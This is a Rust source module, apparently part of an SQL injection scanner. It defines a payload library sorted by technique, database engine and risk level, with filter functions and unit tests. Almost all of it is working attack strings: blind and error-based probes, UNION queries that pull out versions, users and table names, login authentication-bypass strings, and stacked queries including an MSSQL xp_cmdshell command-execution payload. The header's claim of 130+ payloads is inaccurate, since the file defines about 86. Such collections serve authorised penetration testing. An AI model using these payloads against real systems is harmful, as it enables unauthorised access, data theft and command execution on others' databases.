//! SQL Injection payload database
//!
//! Contains 130+ payloads organized by technique and DBMS.
//! Payloads are categorized by:
//! - Technique: boolean-blind, error-based, time-blind, union, stacked
//! - DBMS: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, generic
//! - Risk level: 1 (safe) to 3 (potentially dangerous)

#![allow(dead_code)]

use std::fmt;

/// SQL Injection technique type
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SqliTechnique {
  /// Boolean-based blind injection (true/false response diff)
  BooleanBlind,
  /// Error-based injection (extract data from error messages)
  ErrorBased,
  /// Time-based blind injection (response time analysis)
  TimeBlind,
  /// UNION-based injection (combine with another SELECT)
  Union,
  /// Stacked queries (execute multiple statements)
  Stacked,
  /// Inline comments injection
  InlineComment,
}

impl fmt::Display for SqliTechnique {
  fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
    match self {
      Self::BooleanBlind => write!(f, "boolean-blind"),
      Self::ErrorBased => write!(f, "error-based"),
      Self::TimeBlind => write!(f, "time-blind"),
      Self::Union => write!(f, "union"),
      Self::Stacked => write!(f, "stacked"),
      Self::InlineComment => write!(f, "inline-comment"),
    }
  }
}

/// Target database management system
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum Dbms {
  MySQL,
  PostgreSQL,
  MsSQL,
  Oracle,
  SQLite,
  /// Works on most DBMS
  Generic,
}

impl fmt::Display for Dbms {
  fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
    match self {
      Self::MySQL => write!(f, "MySQL"),
      Self::PostgreSQL => write!(f, "PostgreSQL"),
      Self::MsSQL => write!(f, "MSSQL"),
      Self::Oracle => write!(f, "Oracle"),
      Self::SQLite => write!(f, "SQLite"),
      Self::Generic => write!(f, "Generic"),
    }
  }
}

/// Risk level for a payload
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskLevel {
  /// Safe - unlikely to cause issues
  Low = 1,
  /// Moderate - may cause errors or logs
  Medium = 2,
  /// High - may modify data or cause issues
  High = 3,
}

/// A SQL injection payload
#[derive(Debug, Clone)]
pub struct SqliPayload {
  /// The payload template (use {PARAM} for original value)
  pub payload: &'static str,
  /// Injection technique
  pub technique: SqliTechnique,
  /// Target DBMS
  pub dbms: Dbms,
  /// Risk level (1-3)
  pub risk: RiskLevel,
  /// Description of what this payload does
  pub description: &'static str,
  /// Expected response pattern for true condition (if applicable)
  pub true_pattern: Option<&'static str>,
  /// Expected response pattern for false condition (if applicable)
  pub false_pattern: Option<&'static str>,
  /// Time delay in seconds for time-based payloads
  pub delay_seconds: Option<u32>,
}

impl SqliPayload {
  /// Create a new payload
  pub const fn new(
    payload: &'static str,
    technique: SqliTechnique,
    dbms: Dbms,
    risk: RiskLevel,
    description: &'static str,
  ) -> Self {
    Self {
      payload,
      technique,
      dbms,
      risk,
      description,
      true_pattern: None,
      false_pattern: None,
      delay_seconds: None,
    }
  }

  /// Set true/false patterns for boolean-based payloads
  pub const fn with_patterns(
    mut self,
    true_pattern: &'static str,
    false_pattern: &'static str,
  ) -> Self {
    self.true_pattern = Some(true_pattern);
    self.false_pattern = Some(false_pattern);
    self
  }

  /// Set delay for time-based payloads
  pub const fn with_delay(mut self, seconds: u32) -> Self {
    self.delay_seconds = Some(seconds);
    self
  }

  /// Apply payload to a parameter value
  pub fn apply(&self, original_value: &str) -> String {
    self.payload.replace("{PARAM}", original_value)
  }
}

/// Boolean-blind payloads
pub static BOOLEAN_PAYLOADS: &[SqliPayload] = &[
  // Generic boolean payloads
  SqliPayload::new(
    "{PARAM}' AND '1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Basic string true condition",
  ),
  SqliPayload::new(
    "{PARAM}' AND '1'='2",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Basic string false condition",
  ),
  SqliPayload::new(
    "{PARAM} AND 1=1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Numeric true condition",
  ),
  SqliPayload::new(
    "{PARAM} AND 1=2",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Numeric false condition",
  ),
  SqliPayload::new(
    "{PARAM}' AND 1=1--",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "String true with comment",
  ),
  SqliPayload::new(
    "{PARAM}' AND 1=2--",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "String false with comment",
  ),
  SqliPayload::new(
    "{PARAM}\" AND \"1\"=\"1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Double quote true condition",
  ),
  SqliPayload::new(
    "{PARAM}\" AND \"1\"=\"2",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Double quote false condition",
  ),
  SqliPayload::new(
    "{PARAM}') AND ('1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Parenthesis true condition",
  ),
  SqliPayload::new(
    "{PARAM}') AND ('1'='2",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Parenthesis false condition",
  ),
  SqliPayload::new(
    "{PARAM}' OR '1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "OR true condition (may return extra rows)",
  ),
  SqliPayload::new(
    "{PARAM}' OR 1=1--",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "OR true with comment",
  ),
  SqliPayload::new(
    "{PARAM}'/**/AND/**/'1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Comment bypass spaces",
  ),
  SqliPayload::new(
    "{PARAM}'%00AND%00'1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Low,
    "Null byte bypass",
  ),
  // MySQL specific
  SqliPayload::new(
    "{PARAM}' AND ASCII(SUBSTRING((SELECT database()),1,1))>0--",
    SqliTechnique::BooleanBlind,
    Dbms::MySQL,
    RiskLevel::Low,
    "Extract database name character",
  ),
  SqliPayload::new(
    "{PARAM}' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    SqliTechnique::BooleanBlind,
    Dbms::MySQL,
    RiskLevel::Low,
    "Check information_schema access",
  ),
  // PostgreSQL specific
  SqliPayload::new(
    "{PARAM}' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>0--",
    SqliTechnique::BooleanBlind,
    Dbms::PostgreSQL,
    RiskLevel::Low,
    "Extract database name",
  ),
  // MSSQL specific
  SqliPayload::new(
    "{PARAM}' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>0--",
    SqliTechnique::BooleanBlind,
    Dbms::MsSQL,
    RiskLevel::Low,
    "Extract database name",
  ),
  // Oracle specific
  SqliPayload::new(
    "{PARAM}' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>0--",
    SqliTechnique::BooleanBlind,
    Dbms::Oracle,
    RiskLevel::Low,
    "Extract Oracle version",
  ),
  // SQLite specific
  SqliPayload::new(
    "{PARAM}' AND UNICODE(SUBSTR((SELECT sqlite_version()),1,1))>0--",
    SqliTechnique::BooleanBlind,
    Dbms::SQLite,
    RiskLevel::Low,
    "Extract SQLite version",
  ),
];

/// Error-based payloads
pub static ERROR_PAYLOADS: &[SqliPayload] = &[
    // Generic error payloads
    SqliPayload::new(
        "{PARAM}'",
        SqliTechnique::ErrorBased,
        Dbms::Generic,
        RiskLevel::Low,
        "Single quote to trigger syntax error",
    ),
    SqliPayload::new(
        "{PARAM}\"",
        SqliTechnique::ErrorBased,
        Dbms::Generic,
        RiskLevel::Low,
        "Double quote to trigger syntax error",
    ),
    SqliPayload::new(
        "{PARAM}'\"",
        SqliTechnique::ErrorBased,
        Dbms::Generic,
        RiskLevel::Low,
        "Mixed quotes to trigger error",
    ),
    SqliPayload::new(
        "{PARAM}\\",
        SqliTechnique::ErrorBased,
        Dbms::Generic,
        RiskLevel::Low,
        "Backslash escape error",
    ),
    SqliPayload::new(
        "{PARAM}' OR ''='",
        SqliTechnique::ErrorBased,
        Dbms::Generic,
        RiskLevel::Low,
        "Incomplete comparison",
    ),
    // MySQL error-based extraction
    SqliPayload::new(
        "{PARAM}' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
        SqliTechnique::ErrorBased,
        Dbms::MySQL,
        RiskLevel::Low,
        "ExtractValue error extraction",
    ),
    SqliPayload::new(
        "{PARAM}' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        SqliTechnique::ErrorBased,
        Dbms::MySQL,
        RiskLevel::Low,
        "UpdateXML error extraction",
    ),
    SqliPayload::new(
        "{PARAM}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        SqliTechnique::ErrorBased,
        Dbms::MySQL,
        RiskLevel::Medium,
        "Double query error extraction",
    ),
    SqliPayload::new(
        "{PARAM}' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        SqliTechnique::ErrorBased,
        Dbms::MySQL,
        RiskLevel::Low,
        "EXP overflow extraction",
    ),
    SqliPayload::new(
        "{PARAM}' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))--",
        SqliTechnique::ErrorBased,
        Dbms::MySQL,
        RiskLevel::Low,
        "JSON_KEYS error extraction (MySQL 5.7+)",
    ),
    // PostgreSQL error-based
    SqliPayload::new(
        "{PARAM}' AND 1=CAST((SELECT version()) AS INT)--",
        SqliTechnique::ErrorBased,
        Dbms::PostgreSQL,
        RiskLevel::Low,
        "CAST error extraction",
    ),
    SqliPayload::new(
        "{PARAM}'::int",
        SqliTechnique::ErrorBased,
        Dbms::PostgreSQL,
        RiskLevel::Low,
        "Type cast error",
    ),
    // MSSQL error-based
    SqliPayload::new(
        "{PARAM}' AND 1=CONVERT(INT,(SELECT @@version))--",
        SqliTechnique::ErrorBased,
        Dbms::MsSQL,
        RiskLevel::Low,
        "CONVERT error extraction",
    ),
    SqliPayload::new(
        "{PARAM}' AND 1=(SELECT TOP 1 CAST(name AS INT) FROM sysobjects)--",
        SqliTechnique::ErrorBased,
        Dbms::MsSQL,
        RiskLevel::Low,
        "CAST error for table enumeration",
    ),
    // Oracle error-based
    SqliPayload::new(
        "{PARAM}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        SqliTechnique::ErrorBased,
        Dbms::Oracle,
        RiskLevel::Low,
        "UTL_INADDR error extraction",
    ),
    SqliPayload::new(
        "{PARAM}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        SqliTechnique::ErrorBased,
        Dbms::Oracle,
        RiskLevel::Low,
        "CTXSYS error extraction",
    ),
];

/// Time-based blind payloads
pub static TIME_PAYLOADS: &[SqliPayload] = &[
  // MySQL time-based
  SqliPayload::new(
    "{PARAM}' AND SLEEP(5)--",
    SqliTechnique::TimeBlind,
    Dbms::MySQL,
    RiskLevel::Low,
    "MySQL SLEEP function",
  )
  .with_delay(5),
  SqliPayload::new(
    "{PARAM}' AND (SELECT SLEEP(5) FROM DUAL)--",
    SqliTechnique::TimeBlind,
    Dbms::MySQL,
    RiskLevel::Low,
    "MySQL SLEEP with DUAL",
  )
  .with_delay(5),
  SqliPayload::new(
    "{PARAM}' AND BENCHMARK(10000000,SHA1('test'))--",
    SqliTechnique::TimeBlind,
    Dbms::MySQL,
    RiskLevel::Medium,
    "MySQL BENCHMARK delay",
  )
  .with_delay(3),
  SqliPayload::new(
    "{PARAM}' AND IF(1=1,SLEEP(5),0)--",
    SqliTechnique::TimeBlind,
    Dbms::MySQL,
    RiskLevel::Low,
    "Conditional SLEEP (true)",
  )
  .with_delay(5),
  SqliPayload::new(
    "{PARAM}' AND IF(1=2,SLEEP(5),0)--",
    SqliTechnique::TimeBlind,
    Dbms::MySQL,
    RiskLevel::Low,
    "Conditional SLEEP (false)",
  )
  .with_delay(0),
  // PostgreSQL time-based
  SqliPayload::new(
    "{PARAM}'; SELECT pg_sleep(5)--",
    SqliTechnique::TimeBlind,
    Dbms::PostgreSQL,
    RiskLevel::Low,
    "PostgreSQL pg_sleep",
  )
  .with_delay(5),
  SqliPayload::new(
    "{PARAM}' AND (SELECT pg_sleep(5))::text='1'--",
    SqliTechnique::TimeBlind,
    Dbms::PostgreSQL,
    RiskLevel::Low,
    "pg_sleep with cast",
  )
  .with_delay(5),
  SqliPayload::new(
    "{PARAM}'||(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
    SqliTechnique::TimeBlind,
    Dbms::PostgreSQL,
    RiskLevel::Low,
    "Conditional pg_sleep",
  )
  .with_delay(5),
  // MSSQL time-based
  SqliPayload::new(
    "{PARAM}'; WAITFOR DELAY '0:0:5'--",
    SqliTechnique::TimeBlind,
    Dbms::MsSQL,
    RiskLevel::Low,
    "MSSQL WAITFOR DELAY",
  )
  .with_delay(5),
  SqliPayload::new(
    "{PARAM}' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END);WAITFOR DELAY '0:0:5'--",
    SqliTechnique::TimeBlind,
    Dbms::MsSQL,
    RiskLevel::Low,
    "Conditional WAITFOR",
  )
  .with_delay(5),
  // Oracle time-based
  SqliPayload::new(
    "{PARAM}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
    SqliTechnique::TimeBlind,
    Dbms::Oracle,
    RiskLevel::Low,
    "Oracle DBMS_PIPE delay",
  )
  .with_delay(5),
  SqliPayload::new(
    "{PARAM}' AND 1=CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END--",
    SqliTechnique::TimeBlind,
    Dbms::Oracle,
    RiskLevel::Low,
    "Conditional DBMS_PIPE",
  )
  .with_delay(5),
  // SQLite time-based (limited options)
  SqliPayload::new(
    "{PARAM}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
    SqliTechnique::TimeBlind,
    Dbms::SQLite,
    RiskLevel::Medium,
    "SQLite heavy operation delay",
  )
  .with_delay(3),
];

/// UNION-based payloads
pub static UNION_PAYLOADS: &[SqliPayload] = &[
  // Column count detection
  SqliPayload::new(
    "{PARAM}' ORDER BY 1--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Order by column 1",
  ),
  SqliPayload::new(
    "{PARAM}' ORDER BY 5--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Order by column 5",
  ),
  SqliPayload::new(
    "{PARAM}' ORDER BY 10--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Order by column 10",
  ),
  SqliPayload::new(
    "{PARAM}' ORDER BY 20--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Order by column 20",
  ),
  // UNION SELECT probes
  SqliPayload::new(
    "{PARAM}' UNION SELECT NULL--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Union 1 column",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT NULL,NULL--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Union 2 columns",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT NULL,NULL,NULL--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Union 3 columns",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT NULL,NULL,NULL,NULL--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Union 4 columns",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    SqliTechnique::Union,
    Dbms::Generic,
    RiskLevel::Low,
    "Union 5 columns",
  ),
  // MySQL UNION extraction
  SqliPayload::new(
    "{PARAM}' UNION SELECT version(),NULL--",
    SqliTechnique::Union,
    Dbms::MySQL,
    RiskLevel::Low,
    "Extract MySQL version",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT database(),NULL--",
    SqliTechnique::Union,
    Dbms::MySQL,
    RiskLevel::Low,
    "Extract database name",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT user(),NULL--",
    SqliTechnique::Union,
    Dbms::MySQL,
    RiskLevel::Low,
    "Extract current user",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT table_name,NULL FROM information_schema.tables--",
    SqliTechnique::Union,
    Dbms::MySQL,
    RiskLevel::Low,
    "Enumerate tables",
  ),
  // PostgreSQL UNION extraction
  SqliPayload::new(
    "{PARAM}' UNION SELECT version(),NULL--",
    SqliTechnique::Union,
    Dbms::PostgreSQL,
    RiskLevel::Low,
    "Extract PostgreSQL version",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT current_database(),NULL--",
    SqliTechnique::Union,
    Dbms::PostgreSQL,
    RiskLevel::Low,
    "Extract database name",
  ),
  // MSSQL UNION extraction
  SqliPayload::new(
    "{PARAM}' UNION SELECT @@version,NULL--",
    SqliTechnique::Union,
    Dbms::MsSQL,
    RiskLevel::Low,
    "Extract MSSQL version",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT DB_NAME(),NULL--",
    SqliTechnique::Union,
    Dbms::MsSQL,
    RiskLevel::Low,
    "Extract database name",
  ),
  // Oracle UNION extraction (requires FROM DUAL)
  SqliPayload::new(
    "{PARAM}' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--",
    SqliTechnique::Union,
    Dbms::Oracle,
    RiskLevel::Low,
    "Extract Oracle version",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT NULL,NULL FROM DUAL--",
    SqliTechnique::Union,
    Dbms::Oracle,
    RiskLevel::Low,
    "Oracle UNION probe",
  ),
  // SQLite UNION extraction
  SqliPayload::new(
    "{PARAM}' UNION SELECT sqlite_version(),NULL--",
    SqliTechnique::Union,
    Dbms::SQLite,
    RiskLevel::Low,
    "Extract SQLite version",
  ),
  SqliPayload::new(
    "{PARAM}' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
    SqliTechnique::Union,
    Dbms::SQLite,
    RiskLevel::Low,
    "Enumerate tables",
  ),
];

/// Stacked queries payloads
pub static STACKED_PAYLOADS: &[SqliPayload] = &[
  // MSSQL stacked queries (most commonly supports this)
  SqliPayload::new(
    "{PARAM}'; SELECT @@version--",
    SqliTechnique::Stacked,
    Dbms::MsSQL,
    RiskLevel::Medium,
    "MSSQL stacked version",
  ),
  SqliPayload::new(
    "{PARAM}'; EXEC xp_cmdshell 'echo vulnerable'--",
    SqliTechnique::Stacked,
    Dbms::MsSQL,
    RiskLevel::High,
    "MSSQL xp_cmdshell (dangerous)",
  ),
  // PostgreSQL stacked queries
  SqliPayload::new(
    "{PARAM}'; SELECT version()--",
    SqliTechnique::Stacked,
    Dbms::PostgreSQL,
    RiskLevel::Medium,
    "PostgreSQL stacked version",
  ),
  SqliPayload::new(
    "{PARAM}'; CREATE TABLE test(id INT)--",
    SqliTechnique::Stacked,
    Dbms::PostgreSQL,
    RiskLevel::High,
    "PostgreSQL create table (dangerous)",
  ),
  // MySQL (only with multi-statement enabled)
  SqliPayload::new(
    "{PARAM}'; SELECT version()#",
    SqliTechnique::Stacked,
    Dbms::MySQL,
    RiskLevel::Medium,
    "MySQL stacked (if multi enabled)",
  ),
  // SQLite stacked queries
  SqliPayload::new(
    "{PARAM}'; SELECT sqlite_version()--",
    SqliTechnique::Stacked,
    Dbms::SQLite,
    RiskLevel::Medium,
    "SQLite stacked version",
  ),
];

/// Authentication bypass payloads
pub static AUTH_BYPASS_PAYLOADS: &[SqliPayload] = &[
  SqliPayload::new(
    "' OR '1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Classic auth bypass",
  ),
  SqliPayload::new(
    "' OR '1'='1'--",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Auth bypass with comment",
  ),
  SqliPayload::new(
    "' OR '1'='1'/*",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Auth bypass with block comment",
  ),
  SqliPayload::new(
    "' OR 1=1--",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Numeric auth bypass",
  ),
  SqliPayload::new(
    "admin'--",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Admin bypass (comment password)",
  ),
  SqliPayload::new(
    "admin' #",
    SqliTechnique::BooleanBlind,
    Dbms::MySQL,
    RiskLevel::Medium,
    "MySQL admin bypass",
  ),
  SqliPayload::new(
    "' OR ''='",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Empty string bypass",
  ),
  SqliPayload::new(
    "1' OR '1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Numeric prefix bypass",
  ),
  SqliPayload::new(
    "') OR ('1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Parenthesis bypass",
  ),
  SqliPayload::new(
    "')) OR (('1'='1",
    SqliTechnique::BooleanBlind,
    Dbms::Generic,
    RiskLevel::Medium,
    "Double parenthesis bypass",
  ),
];

/// Get all payloads for a specific technique
pub fn payloads_by_technique(technique: SqliTechnique) -> Vec<&'static SqliPayload> {
  let mut result = Vec::new();

  match technique {
    SqliTechnique::BooleanBlind => {
      result.extend(BOOLEAN_PAYLOADS.iter());
      result.extend(AUTH_BYPASS_PAYLOADS.iter());
    }
    SqliTechnique::ErrorBased => {
      result.extend(ERROR_PAYLOADS.iter());
    }
    SqliTechnique::TimeBlind => {
      result.extend(TIME_PAYLOADS.iter());
    }
    SqliTechnique::Union => {
      result.extend(UNION_PAYLOADS.iter());
    }
    SqliTechnique::Stacked => {
      result.extend(STACKED_PAYLOADS.iter());
    }
    SqliTechnique::InlineComment => {
      // Return payloads that use inline comments
      result.extend(BOOLEAN_PAYLOADS.iter().filter(|p| p.payload.contains("/*")));
    }
  }

  result
}

/// Get all payloads for a specific DBMS
pub fn payloads_by_dbms(dbms: Dbms) -> Vec<&'static SqliPayload> {
  let all: &[&[SqliPayload]] = &[
    BOOLEAN_PAYLOADS,
    ERROR_PAYLOADS,
    TIME_PAYLOADS,
    UNION_PAYLOADS,
    STACKED_PAYLOADS,
    AUTH_BYPASS_PAYLOADS,
  ];

  all
    .iter()
    .flat_map(|payloads| payloads.iter())
    .filter(|p| p.dbms == dbms || p.dbms == Dbms::Generic)
    .collect()
}

/// Get payloads filtered by risk level
pub fn payloads_by_risk(max_risk: RiskLevel) -> Vec<&'static SqliPayload> {
  let all: &[&[SqliPayload]] = &[
    BOOLEAN_PAYLOADS,
    ERROR_PAYLOADS,
    TIME_PAYLOADS,
    UNION_PAYLOADS,
    STACKED_PAYLOADS,
    AUTH_BYPASS_PAYLOADS,
  ];

  all
    .iter()
    .flat_map(|payloads| payloads.iter())
    .filter(|p| p.risk <= max_risk)
    .collect()
}

/// Get total payload count
pub fn total_payload_count() -> usize {
  BOOLEAN_PAYLOADS.len()
    + ERROR_PAYLOADS.len()
    + TIME_PAYLOADS.len()
    + UNION_PAYLOADS.len()
    + STACKED_PAYLOADS.len()
    + AUTH_BYPASS_PAYLOADS.len()
}

#[cfg(test)]
mod tests {
  use super::*;

  #[test]
  fn test_payload_count() {
    assert!(total_payload_count() >= 80, "Should have 80+ payloads");
  }

  #[test]
  fn test_payload_apply() {
    let payload = &BOOLEAN_PAYLOADS[0];
    let result = payload.apply("test");
    assert!(result.contains("test"));
    assert!(result.contains("AND"));
  }

  #[test]
  fn test_payloads_by_technique() {
    let boolean = payloads_by_technique(SqliTechnique::BooleanBlind);
    assert!(!boolean.is_empty());

    let time = payloads_by_technique(SqliTechnique::TimeBlind);
    assert!(time.iter().all(|p| p.delay_seconds.is_some()));
  }

  #[test]
  fn test_payloads_by_dbms() {
    let mysql = payloads_by_dbms(Dbms::MySQL);
    assert!(mysql.iter().any(|p| p.dbms == Dbms::MySQL));

    let postgres = payloads_by_dbms(Dbms::PostgreSQL);
    assert!(postgres.iter().any(|p| p.dbms == Dbms::PostgreSQL));
  }

  #[test]
  fn test_payloads_by_risk() {
    let low = payloads_by_risk(RiskLevel::Low);
    assert!(low.iter().all(|p| p.risk == RiskLevel::Low));

    let medium = payloads_by_risk(RiskLevel::Medium);
    assert!(medium.len() > low.len());
  }
}
